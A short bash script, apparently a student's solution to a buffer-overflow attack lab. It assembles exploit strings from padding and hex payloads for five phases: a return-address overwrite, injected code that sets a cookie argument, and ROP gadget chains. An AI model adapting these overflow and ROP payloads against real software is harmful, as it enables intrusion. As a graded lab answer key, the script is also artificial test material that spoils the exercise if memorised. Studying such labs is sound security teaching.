#!/usr/bin/env bash

pading="ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff"

hex1="c0 17 40"

# hex2="a8 dc 61 55 00 00 00 00 68 ec 17 40 00 48 c7 c7 fa 97 b9 59 c3"
hex2="b0 dc 61 55 00 00 00 00 ec 17 40 00 00 00 00 00 48 c7 c7 fa 97 b9 59 c3"

# hex3="a8 dc 61 55 00 00 00 00 68 fa 18 40 00 48 8d 7c 24 13 c3 35 39 62 39 39 37 66 61 00"
hex3="b0 dc 61 55 00 00 00 00 fa 18 40 00 00 00 00 00 48 8d 7c 24 0e c3 35 39 62 39 39 37 66 61 00"

hex4="ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 c6 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00"

hex5="ad 1a 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 ab 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 dd 19 40 00 00 00 00 00 69 1a 40 00 00 00 00 00 13 1a 40 00 00 00 00 00 d6 19 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00"

# 35 39 62 39 39 37 66 61 00
# fa 18 40 00 00 00 00 00
# a2 19 40 00 00 00 00 00
# d6 19 40 00 00 00 00 00
# 13 1a 40 00 00 00 00 00
# 69 1a 40 00 00 00 00 00
# dd 19 40 00 00 00 00 00
# 48 00 00 00 00 00 00 00
# ab 19 40 00 00 00 00 00
# a2 19 40 00 00 00 00 00
# ad 1a 40 00 00 00 00 00

test=

case $1 in
  1) HEX="$hex1" ;;
  2) HEX="$hex2" ;;
  3) HEX="$hex3" ;;
  4) HEX="$hex4" ;;
  5) HEX="$hex5" ;;
  test) HEX="$test";;
esac

gcc -c code.s && objdump -d code.o > code.d
echo "${pading} ${HEX}" | ../hex2raw > exploit-string
